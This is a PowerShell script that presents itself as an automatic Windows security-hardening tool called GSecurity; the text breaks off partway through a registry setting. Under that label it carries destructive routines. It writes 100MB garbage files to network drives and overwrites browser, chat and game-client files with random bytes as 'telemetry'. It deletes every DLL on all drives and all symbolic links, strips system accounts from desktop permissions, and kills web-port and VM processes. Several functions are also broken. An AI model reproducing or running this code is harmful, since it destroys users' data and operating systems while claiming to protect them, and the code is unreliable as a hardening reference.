$scriptBlock = {
    <#
        Script Name: GSecurity
        Author: Gorstak
        Description: Automatically runs security monitoring and hardening features with zero user input.
                     Includes file system monitoring, VirusTotal integration, and features from GShield C# script.
        Version: 5.7
        License: Free for personal use
    #>

    # Constants
    $logonGroup = "Console Logon"
    $validGroups = @($logonGroup)
    $consoleUser = (Get-CimInstance -Class Win32_ComputerSystem).UserName
    $VirusTotalApiKey = "YOUR_VIRUSTOTAL_API_KEY_HERE"  # Replace with your actual VirusTotal API key
    $scannedFiles = @{}  # Global hashtable to cache VirusTotal scan results
    $lastTelemetryCorruptTime = [DateTime]::MinValue

    # Whitelist of critical processes (system-related)
    $whitelistedProcesses = @(
        "explorer", "winlogon", "taskhostw", "csrss", "services", "lsass", "dwm", "svchost",
        "smss", "wininit", "System", "conhost", "cmd", "powershell"
    )

    # Log function
    function Write-Log {
        param ([string]$message)
        $logPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents\GShield_Log.txt")
        $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        $logMessage = "$timestamp - $message"
        try {
            Add-Content -Path $logPath -Value $logMessage -ErrorAction SilentlyContinue
        } catch {
            Write-Output "Error writing to log: $_"
        }
    }

    # Function to check if the file has already been scanned and is clean
    function Check-FileInVirusTotalCache {
        param ([string]$fileHash)
        if ($scannedFiles.ContainsKey($fileHash)) {
            Write-Log "File hash $fileHash found in cache (clean)."
            return $true
        } else {
            return $false
        }
    }

    # Function to send the file to VirusTotal, upload if necessary, and check scan results
    function Get-VirusTotalScan {
        param ([string]$FilePath)

        $fileHash = (Get-FileHash -Algorithm SHA256 -Path $FilePath -ErrorAction SilentlyContinue).Hash
        if (Check-FileInVirusTotalCache -fileHash $fileHash) {
            return $null
        }

        $headers = @{"x-apikey" = $VirusTotalApiKey}
        $fileSize = (Get-Item $FilePath -ErrorAction SilentlyContinue).Length

        $url = "https://www.virustotal.com/api/v3/files/$fileHash"
        try {
            $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction SilentlyContinue
            if ($response -and $response.data.attributes.last_analysis_stats.malicious -eq 0) {
                Write-Log "File $FilePath is clean, already scanned."
                $scannedFiles[$fileHash] = $true
                return $response
            } elseif ($response) {
                Write-Log "File $FilePath found in VirusTotal with malicious detections."
                return $response
            }
        } catch {
            Write-Log "File $FilePath not found in VirusTotal database or error occurred: $($_.Exception.Message)"
        }

        if ($fileSize -gt 32MB) {
            Write-Log "File $FilePath exceeds 32MB VirusTotal limit. Skipping upload."
            return $null
        }

        Write-Log "Uploading file $FilePath to VirusTotal for analysis."
        $uploadUrl = "https://www.virustotal.com/api/v3/files"
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$([System.IO.Path]::GetFileName($FilePath))"
Content-Type: application/octet-stream

$([System.Text.Encoding]::Default.GetString($fileContent))
--$boundary--
"@

        try {
            $uploadResponse = Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop
            $analysisId = $uploadResponse.data.id
            Write-Log "File $FilePath uploaded to VirusTotal. Analysis ID: $analysisId"

            $analysisUrl = "https://www.virustotal.com/api/v3/analyses/$analysisId"
            $maxAttempts = 10
            $attempt = 0
            $delaySeconds = 30

            do {
                Start-Sleep -Seconds $delaySeconds
                $attempt++
                $analysisResponse = Invoke-RestMethod -Uri $analysisUrl -Headers $headers -Method Get -ErrorAction Stop
                if ($analysisResponse.data.attributes.status -eq "completed") {
                    Write-Log "Analysis for $FilePath completed."
                    break
                }
                Write-Log "Waiting for analysis of $FilePath (Attempt $attempt/$maxAttempts)..."
            } while ($attempt -lt $maxAttempts)

            if ($analysisResponse.data.attributes.status -ne "completed") {
                Write-Log "Analysis for $FilePath did not complete within time limit."
                return $null
            }

            $scanResults = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction Stop
            if ($scanResults.data.attributes.last_analysis_stats.malicious -eq 0) {
                Write-Log "File $FilePath is clean according to VirusTotal."
                $scannedFiles[$fileHash] = $true
            }
            return $scanResults
        } catch {
            Write-Log "Error uploading or analyzing $FilePath with VirusTotal: $($_.Exception.Message)"
            return $null
        }
    }

    # Function to block execution of a file
    function Block-Execution {
        param (
            [string]$FilePath,
            [string]$Reason
        )
        try {
            $acl = Get-Acl -Path $FilePath -ErrorAction Stop
            $acl.SetAccessRuleProtection($true, $false)
            $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) }
            Set-Acl -Path $FilePath -AclObject $acl -ErrorAction Stop
            Write-Log "Blocked file ${FilePath}: ${Reason}"
        } catch {
            Write-Log "Error blocking execution of ${FilePath}: $($_.Exception.Message)"
        }
    }

    # Function to check the file certificate (used only for DLLs)
    function Check-FileCertificate {
        param ([string]$FilePath)
        try {
            $signature = Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction Stop
            switch ($signature.Status) {
                'Valid' { return $true }
                'NotSigned' {
                    Write-Log "File $FilePath is not digitally signed."
                    return $false
                }
                'UnknownError' {
                    Write-Log "Unknown error while verifying signature of $FilePath."
                    return $false
                }
                default {
                    Write-Log "File $FilePath has an invalid or untrusted signature: $($signature.Status)"
                    return $false
                }
            }
        } catch {
            Write-Log "Error checking certificate for ${FilePath}: $($_.Exception.Message)"
            return $false
        }
    }

    # Function to monitor file changes
    function Monitor-Path {
        param ([string]$Path)
        try {
            $fileWatcher = New-Object System.IO.FileSystemWatcher
            $fileWatcher.Path = $Path
            $fileWatcher.IncludeSubdirectories = $true
            $fileWatcher.EnableRaisingEvents = $true

            Register-ObjectEvent -InputObject $fileWatcher -EventName "Created" -Action {
                $filePath = $Event.SourceEventArgs.FullPath
                Write-Log "New file created: $filePath"
                $scanResults = Get-VirusTotalScan -FilePath $filePath
                if ($scanResults -and $scanResults.data.attributes.last_analysis_stats.malicious -gt 0) {
                    Block-Execution -FilePath $filePath -Reason "File detected as malware on VirusTotal"
                }
            } | Out-Null

            Register-ObjectEvent -InputObject $fileWatcher -EventName "Changed" -Action {
                $filePath = $Event.SourceEventArgs.FullPath
                Write-Log "File modified: $filePath"
            } | Out-Null
        } catch {
            Write-Log "Error setting up file watcher for $Path: $_"
        }
    }

    # Remove suspicious DLLs from loaded processes
    function Monitor-LoadedDLLs {
        Write-Log "Monitoring all loaded DLLs system-wide."
        $processes = Get-Process | Where-Object { $_.ProcessName -ne "Idle" }
        foreach ($process in $processes) {
            try {
                $modules = $process.Modules
                foreach ($module in $modules) {
                    try {
                        $cert = Get-AuthenticodeSignature $module.FileName -ErrorAction Stop
                        if ($cert.Status -ne "Valid") {
                            Write-Log "Removing suspicious DLL: $($module.FileName)"
                            Remove-Item -Path $module.FileName -Force -ErrorAction Stop
                        }
                    } catch {
                        Write-Log "Error checking DLL $($module.FileName): $_"
                    }
                }
            } catch {
                Write-Log "Skipping process $($process.ProcessName): $_"
            }
        }
    }

    # Terminate processes with details
    function Get-ProcessDetailsAndTerminate {
        param ([int]$ProcessId)
        try {
            $process = Get-Process -Id $ProcessId -ErrorAction Stop
            $processName = $process.Name
            $processOwner = (Get-CimInstance Win32_Process -Filter "ProcessId = $ProcessId").GetOwner().User
            Write-Log "Detected process to terminate: $processName (PID: $ProcessId), Owner: $processOwner"
            if ($processName -notin $whitelistedProcesses) {
                Write-Log "Terminating process: $processName (PID: $ProcessId)"
                Stop-Process -Id $ProcessId -Force -ErrorAction SilentlyContinue
            } else {
                Write-Log "Whitelisted process detected, skipping termination: $processName (PID: $ProcessId)"
            }
        } catch {
            Write-Log "Error retrieving details for process ID $ProcessId: $($_.Exception.Message)"
        }
    }

    # Fill remote drives with garbage
    function Fill-RemoteDriveWithGarbage {
        try {
            $connections = Get-NetTCPConnection
            if ($connections.Length -gt 0) {
                $searcher = New-Object System.Management.ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DriveType=4")
                foreach ($drive in $searcher.Get()) {
                    $mountPoint = "$($drive['DeviceID'])\"
                    if ($mountPoint.StartsWith("\\")) {
                        $filePath = Join-Path -Path $mountPoint -ChildPath "garbage_1.dat"
                        try {
                            $garbage = [byte[]]::new(100MB)
                            (New-Object System.Random).NextBytes($garbage)
                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
                            Write-Log "Wrote garbage file to remote drive: $filePath"
                        } catch {
                            Write-Log "Error writing garbage file to $filePath: $_"
                        }
                    }
                }
            }
        } catch {
            Write-Log "Error in Fill-RemoteDriveWithGarbage: $_"
        }
    }

    # Corrupt telemetry files
    function Corrupt-Telemetry {
        $targetFiles = @(
            "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl",
            "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener_1.etl",
            "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\ShutdownLogger.etl",
            "$env:LocalAppData\Microsoft\Windows\WebCache\WebCacheV01.dat",
            "$env:ProgramData\Microsoft\Windows\AppRepository\StateRepository-Deployment.srd",
            "$env:ProgramData\Microsoft\Diagnosis\eventTranscript\eventTranscript.db",
            "$env:SystemRoot\System32\winevt\Logs\Microsoft-Windows-Telemetry%4Operational.evtx",
            "$env:LocalAppData\Microsoft\Edge\User Data\Default\Preferences",
            "$env:ProgramData\NVIDIA Corporation\NvTelemetry\NvTelemetryContainer.etl",
            "$env:ProgramFiles\NVIDIA Corporation\NvContainer\NvContainerTelemetry.etl",
            "$env:LocalAppData\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log",
            "$env:LocalAppData\Google\Chrome\User Data\EventLog\*.etl",
            "$env:LocalAppData\Google\Chrome\User Data\Default\Web Data",
            "$env:ProgramFiles(x86)\Google\Update\GoogleUpdate.log",
            "$env:ProgramData\Adobe\ARM\log\ARMTelemetry.etl",
            "$env:LocalAppData\Adobe\Creative Cloud\ACC\logs\CoreSync.log",
            "$env:ProgramFiles\Common Files\Adobe\OOBE\PDApp.log",
            "$env:ProgramData\Intel\Telemetry\IntelData.etl",
            "$env:ProgramFiles\Intel\Driver Store\Telemetry\IntelGFX.etl",
            "$env:SystemRoot\System32\DriverStore\FileRepository\igdlh64.inf_amd64_*\IntelCPUTelemetry.dat",
            "$env:ProgramData\AMD\CN\AMDDiag.etl",
            "$env:LocalAppData\AMD\CN\logs\RadeonSoftware.log",
            "$env:ProgramFiles\AMD\CNext\CNext\AMDTel.db",
            "$env:ProgramFiles(x86)\Steam\logs\perf.log",
            "$env:LocalAppData\Steam\htmlcache\Cookies",
            "$env:ProgramData\Steam\SteamAnalytics.etl",
            "$env:ProgramData\Epic\EpicGamesLauncher\Data\EOSAnalytics.etl",
            "$env:LocalAppData\EpicGamesLauncher\Saved\Logs\EpicGamesLauncher.log",
            "$env:LocalAppData\Discord\app-*\modules\discord_analytics\*.log",
            "$env:AppData\Discord\Local Storage\leveldb\*.ldb",
            "$env:LocalAppData\Autodesk\Autodesk Desktop App\Logs\AdskDesktopAnalytics.log",
            "$env:ProgramData\Autodesk\Adlm\Telemetry\AdlmTelemetry.etl",
            "$env:AppData\Mozilla\Firefox\Profiles\*\telemetry.sqlite",
            "$env:LocalAppData\Mozilla\Firefox\Telemetry\Telemetry.etl",
            "$env:LocalAppData\Logitech\LogiOptions\logs\LogiAnalytics.log",
            "$env:ProgramData\Logitech\LogiSync\Telemetry.etl",
            "$env:ProgramData\Razer\Synapse3\Logs\RazerSynapse.log",
            "$env:LocalAppData\Razer\Synapse\Telemetry\RazerTelemetry.etl",
            "$env:ProgramData\Corsair\CUE\logs\iCUETelemetry.log",
            "$env:LocalAppData\Corsair\iCUE\Analytics\*.etl",
            "$env:ProgramData\Kaspersky Lab\AVP*\logs\Telemetry.etl",
            "$env:ProgramData\McAfee\Agent\logs\McTelemetry.log",
            "$env:ProgramData\Norton\Norton\Logs\NortonAnalytics.etl",
            "$env:ProgramFiles\Bitdefender\Bitdefender Security\logs\BDTelemetry.db",
            "$env:LocalAppData\Slack\logs\SlackAnalytics.log",
            "$env:ProgramData\Dropbox\client\logs\DropboxTelemetry.etl",
            "$env:LocalAppData\Zoom\logs\ZoomAnalytics.log"
        )

        foreach ($file in $targetFiles) {
            try {
                if (Test-Path $file -ErrorAction SilentlyContinue) {
                    $size = (Get-Item $file).Length
                    $junk = [byte[]]::new($size)
                    (New-Object System.Random).NextBytes($junk)
                    [System.IO.File]::WriteAllBytes($file, $junk)
                    Write-Log "Corrupted telemetry file: $file"
                }
            } catch {
                Write-Log "Error corrupting telemetry file $file: $_"
            }
        }
    }

    # VPN monitoring
    function Vpn-Monitor {
        try {
            if (-not (Check-Vpn)) {
                $vpnInfo = Get-PublicVpn
                if ($vpnInfo.Host) {
                    Connect-Vpn -Host $vpnInfo.Host
                }
            }
        } catch {
            Write-Log "Error in Vpn-Monitor: $_"
        }
    }

    function Get-PublicVpn {
        try {
            $response = Invoke-WebRequest -Uri "https://www.vpngate.net/api/iphone/" -TimeoutSec 5 -ErrorAction Stop
            $lines = $response.Content -split "`n" | Where-Object { $_ -match "," }
            $servers = $lines | ForEach-Object {
                $parts = $_ -split ","
                if ($parts.Length -gt 6) {
                    [PSCustomObject]@{
                        Host    = $parts[1]
                        Country = $parts[2]
                        Ping    = [int]::TryParse($parts[6], [ref]$null) ? [int]$parts[6] : [int]::MaxValue
                    }
                }
            } | Sort-Object Ping

            if ($servers) {
                $first = $servers[0]
                return [PSCustomObject]@{ Host = $first.Host; Country = $first.Country }
            }
            return [PSCustomObject]@{ Host = $null; Country = $null }
        } catch {
            Write-Log "Error fetching public VPN: $_"
            return [PSCustomObject]@{ Host = $null; Country = $null }
        }
    }

    function Connect-Vpn {
        param ([string]$Host)
        try {
            $process = Start-Process -FilePath "rasdial" -ArgumentList "MyVPN $Host vpn vpn" -NoNewWindow -PassThru -Wait -ErrorAction Stop
            if ($process.ExitCode -eq 0) {
                Write-Log "Successfully connected to VPN: $Host"
                return $true
            } else {
                Write-Log "Failed to connect to VPN: $Host"
                return $false
            }
        } catch {
            Write-Log "Error connecting to VPN $Host: $_"
            return $false
        }
    }

    function Check-Vpn {
        try {
            $process = Start-Process -FilePath "rasdial" -NoNewWindow -PassThru -RedirectStandardOutput "$env:TEMP\rasdial_output.txt" -Wait -ErrorAction Stop
            $output = Get-Content -Path "$env:TEMP\rasdial_output.txt" -ErrorAction SilentlyContinue
            Remove-Item -Path "$env:TEMP\rasdial_output.txt" -Force -ErrorAction SilentlyContinue
            return $output -match "Connected"
        } catch {
            Write-Log "Error checking VPN status: $_"
            return $false
        }
    }

    # Remove suspicious DLLs from drives
    function Remove-SuspiciousDLLs {
        try {
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null }
            foreach ($drive in $drives) {
                $dlls = Get-ChildItem -Path $drive.Root -Filter "*.dll" -Recurse -ErrorAction SilentlyContinue
                foreach ($dll in $dlls) {
                    $processes = Get-Process | Where-Object { $_.Path -eq $dll.FullName } -ErrorAction SilentlyContinue
                    foreach ($process in $processes) {
                        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
                    }
                    Set-ItemProperty -Path $dll.FullName -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
                    Remove-Item -Path $dll.FullName -Force -ErrorAction SilentlyContinue
                    Write-Log "Removed suspicious DLL: $($dll.FullName)"
                }
            }
        } catch {
            Write-Log "Error in Remove-SuspiciousDLLs: $_"
        }
    }

    # Kill processes on specific ports
    function Kill-ProcessesOnPorts {
        $ports = @(80, 443, 8080, 8888)
        try {
            $output = netstat -a -n -o
            $lines = $output -split "`n" | Where-Object { $_ -match "TCP" }
            foreach ($line in $lines) {
                $parts = $line -split "\s+" | Where-Object { $_ }
                if ($parts.Length -ge 5 -and [int]::TryParse($parts[4], [ref]$null)) {
                    $port = [int]($parts[1].Split(":")[-1])
                    $pid = [int]$parts[4]
                    if ($ports -contains $port -and $pid -notin $whitelistedProcesses) {
                        Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
                        Write-Log "Killed process on port $port (PID: $pid)"
                    }
                }
            }
        } catch {
            Write-Log "Error in Kill-ProcessesOnPorts: $_"
        }
    }

    # Stop virtual machine processes
    function Stop-AllVMs {
        $vmProcesses = @(
            "vmware-vmx", "vmware", "vmware-tray", "vmwp", "vmnat", "vmnetdhcp", "vmware-authd", "vmware-usbarbitrator",
            "vmms", "vmcompute", "vmsrvc", "hvhost", "vmmem", "VBoxSVC", "VBoxHeadless", "VirtualBoxVM", "VBoxManage",
            "qemu-system-x86_64", "qemu-system-i386", "qemu-system-arm", "qemu-system-aarch64", "kvm", "qemu-kvm",
            "prl_client_app", "prl_cc", "prl_tools_service", "prl_vm_app", "bhyve", "xen", "xenservice", "bochs",
            "dosbox", "utm", "wsl", "wslhost", "simics", "vbox", "parallels"
        )
        try {
            $processes = Get-Process | Where-Object { $vmProcesses -contains $_.ProcessName.ToLower() } -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
                Write-Log "Stopped VM process: $($process.ProcessName) (PID: $($process.Id))"
            }
        } catch {
            Write-Log "Error in Stop-AllVMs: $_"
        }
    }

    # Clean RAM
    function Clean-Ram {
        try {
            foreach ($process in Get-Process) {
                try {
                    [Win32]::EmptyWorkingSet($process.Handle)
                    [Win32]::FlushInstructionCache($process.Handle, [IntPtr]::Zero, 0)
                } catch {
                    Write-Log "Error cleaning RAM for process $($process.ProcessName): $_"
                }
            }
            Write-Log "RAM cleaned successfully."
        } catch {
            Write-Log "Error in Clean-Ram: $_"
        }
    }

    # Harden system
    function Harden-System {
        try {
            Harden-PrivilegeRights
            Cleanup-Autopilot
            Set-UacToMaximum
            Remove-DefaultUsers
            Set-DrivePermissions
            Harden-DesktopPermissions
            Remove-SymbolicLinks
            Disable-PxeOnNetworkAdapters
            Disable-NetBios
            Set-RegistryPermissions
            Apply-AdditionalRegistrySettings
            Disable-Services
            Write-Log "System hardening completed."
        } catch {
            Write-Log "Error in Harden-System: $_"
        }
    }

    function Harden-PrivilegeRights {
        try {
            $tempCfgPath = "C:\secpol.cfg"
            $sdbPath = "C:\Windows\security\local.sdb"
            Start-Process -FilePath "secedit" -ArgumentList "/export /cfg $tempCfgPath /quiet" -NoNewWindow -Wait -ErrorAction SilentlyContinue

            $privilegeSettings = @"
[Privilege Rights]
SeChangeNotifyPrivilege = *S-1-1-0
SeInteractiveLogonRight = *S-1-5-32-544
SeDenyNetworkLogonRight = *S-1-5-11
SeDenyInteractiveLogonRight = Guest
SeDenyRemoteInteractiveLogonRight = *S-1-5-11
SeDenyServiceLogonRight = *S-1-5-32-545
SeNetworkLogonRight=
SeRemoteShutdownPrivilege=
SeAssignPrimaryTokenPrivilege=
SeBackupPrivilege=
SeCreateTokenPrivilege=
SeDebugPrivilege=
SeImpersonatePrivilege=
SeLoadDriverPrivilege=
SeRemoteInteractiveLogonRight=
SeServiceLogonRight=
"@
            Add-Content -Path $tempCfgPath -Value $privilegeSettings -ErrorAction SilentlyContinue
            Start-Process -FilePath "secedit" -ArgumentList "/configure /db $sdbPath /cfg $tempCfgPath /areas USER_RIGHTS /quiet" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            Remove-Item -Path $tempCfgPath -Force -ErrorAction SilentlyContinue
            Write-Log "Privilege rights hardened."
        } catch {
            Write-Log "Error in Harden-PrivilegeRights: $_"
        }
    }

    function Cleanup-Autopilot {
        try {
            Start-Process -FilePath "powershell" -ArgumentList "-Command `"Uninstall-ProvisioningPackage -AllInstalledPackages -ErrorAction SilentlyContinue`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            $provisioningPath = "$env:ProgramData\Microsoft\Provisioning"
            if (Test-Path $provisioningPath) {
                Remove-Item -Path $provisioningPath -Recurse -Force -ErrorAction SilentlyContinue
            }
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DriverInstall\Restrictions" -Name "AllowUserDeviceClasses" -Value 0 -Type DWord -ErrorAction SilentlyContinue
            Write-Log "Autopilot cleaned up."
        } catch {
            Write-Log "Error in Cleanup-Autopilot: $_"
        }
    }

    function Set-UacToMaximum {
        try {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 2 -Type DWord -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorUser" -Value 0 -Type DWord -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1 -Type DWord -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1 -Type DWord -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "FilterAdministratorToken" -Value 0 -Type DWord -ErrorAction SilentlyContinue
            Write-Log "UAC set to maximum."
        } catch {
            Write-Log "Error in Set-UacToMaximum: $_"
        }
    }

    function Remove-DefaultUsers {
        try {
            foreach ($user in @("defaultuser0", "defaultuser1", "defaultuser100000")) {
                Start-Process -FilePath "net" -ArgumentList "user $user /delete" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            }
            Write-Log "Default users removed."
        } catch {
            Write-Log "Error in Remove-DefaultUsers: $_"
        }
    }

    function Set-DrivePermissions {
        try {
            foreach ($drive in Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null }) {
                $driveRoot = $drive.Root
                Start-Process -FilePath "takeown" -ArgumentList "/f `"$driveRoot`" /r /d y" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /setowner `"Administrators`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /grant:r `"console logon:M`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /remove `"Everyone`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue

                $searcher = New-Object System.Management.ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DeviceID = '$($driveRoot.TrimEnd('\'))'")
                foreach ($disk in $searcher.Get()) {
                    if ($disk["DriveType"] -eq "2" -and $disk["FileSystem"] -eq "NTFS") {
                        Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /grant:r `"Users:RX`" /T /C" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                        Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /grant:r `"System:F`" /T /C" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                        Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /grant:r `"Administrators:F`" /T /C" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                        Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /grant:r `"Authenticated Users:M`" /T /C" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                        Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /remove `"Everyone`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                        Start-Process -FilePath "icacls" -ArgumentList "`"$driveRoot`" /remove `"Authenticated Users`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                    }
                }
            }
            Write-Log "Drive permissions set."
        } catch {
            Write-Log "Error in Set-DrivePermissions: $_"
        }
    }

    function Harden-DesktopPermissions {
        try {
            $paths = @("C:\Users\Public\Desktop", "$env:USERPROFILE\Desktop")
            foreach ($path in $paths) {
                if (Test-Path $path -ErrorAction SilentlyContinue) {
                    Start-Process -FilePath "takeown" -ArgumentList "/f `"$path`" /r /d y" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                    Start-Process -FilePath "icacls" -ArgumentList "`"$path`" /inheritance:d /T /C" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                    $removeSids = @("INTERACTIVE", "SERVICE", "BATCH", "CREATOR OWNER", "System", "Administrators")
                    foreach ($sid in $removeSids) {
                        Start-Process -FilePath "icacls" -ArgumentList "`"$path`" /remove `"$sid`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                    }
                    Start-Process -FilePath "icacls" -ArgumentList "`"$path`" /inheritance:r" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                }
            }
            Write-Log "Desktop permissions hardened."
        } catch {
            Write-Log "Error in Harden-DesktopPermissions: $_"
        }
    }

    function Remove-SymbolicLinks {
        try {
            foreach ($drive in Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null }) {
                $files = Get-ChildItem -Path $drive.Root -Recurse -Attributes ReparsePoint -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
                    Write-Log "Removed symbolic link: $($file.FullName)"
                }
            }
        } catch {
            Write-Log "Error in Remove-SymbolicLinks: $_"
        }
    }

    function Disable-PxeOnNetworkAdapters {
        try {
            $searcher = New-Object System.Management.ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter")
            foreach ($adapter in $searcher.Get()) {
                $guid = $adapter["GUID"]
                if ($guid) {
                    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$guid" -Name "DisablePXE" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpipv6\Parameters\Interfaces\$guid" -Name "DisablePXE" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                }
            }
            Write-Log "PXE disabled on network adapters."
        } catch {
            Write-Log "Error in Disable-PxeOnNetworkAdapters: $_"
        }
    }

    function Disable-NetBios {
        try {
            Start-Process -FilePath "sc" -ArgumentList "config lmhosts start= disabled" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            $searcher = New-Object System.Management.ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = true")
            foreach ($config in $searcher.Get()) {
                $config.InvokeMethod("SetTcpipNetbios", @(2))
            }
            Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableNetbios" -Value 0 -Type DWord -ErrorAction SilentlyContinue
            Write-Log "NetBIOS disabled."
        } catch {
            Write-Log "Error in Disable-NetBios: $_"
        }
    }

    function Set-RegistryPermissions {
        try {
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\gpsvc"
            Start-Process -FilePath "sc" -ArgumentList "stop gpsvc" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            Start-Process -FilePath "icacls" -ArgumentList "`"$regPath`" /setowner `"Administrators`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            Start-Process -FilePath "icacls" -ArgumentList "`"$regPath`" /inheritance:d" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            Start-Process -FilePath "icacls" -ArgumentList "`"$regPath`" /grant `"Administrators:F`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
            Write-Log "Registry permissions set."
        } catch {
            Write-Log "Error in Set-RegistryPermissions: $_"
        }
    }

    function Apply-AdditionalRegistrySettings {
        try {
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOM" -Value "N" -Type String -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Rpc\Internet" -Name "UseInternetPorts" -Value "N" -Type String -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" -Name "MitigationOptions" -Value 49 -Type DWord -ErrorAction SilentlyContinue

            $defaultLaunchPermission = [byte[]]@(
                0x01,0x00,0x04,0x80,0x9C,0x00,0x00,0x00,0xAC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x14,0x00,0x00,0x00,0x02,0x00,0x88,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x14,0x00,
                0x15,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x12,0x00,0x00,0x00,
                0x00,0x00,0x18,0x00,0x15,0x00,0x00,0x00,0x01,0x02,0x00,0x00,0x00,0x00,0x00,0x05,
                0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x00,0x00,0x14,0x00,0x15,0x00,0x00,0x00,
                0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x04,0x00,0x00,0x00,0x00,0x00,0x14,0x00,
                0x0B,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x12,0x00,0x00,0x00,
                0x00,0x00,0x18,0x00,0x0B,0x00,0x00,0x00,0x01,0x02,0x00,0x00,0x00,0x00,0x00,0x05,
                0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x00,0x00,0x14,0x00,0x0B,0x00,0x00,0x00,
                0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x04,0x00,0x00,0x00,0x01,0x02,0x00,0x00,
                0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x01,0x02,0x00,0x00,
                0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00
            )
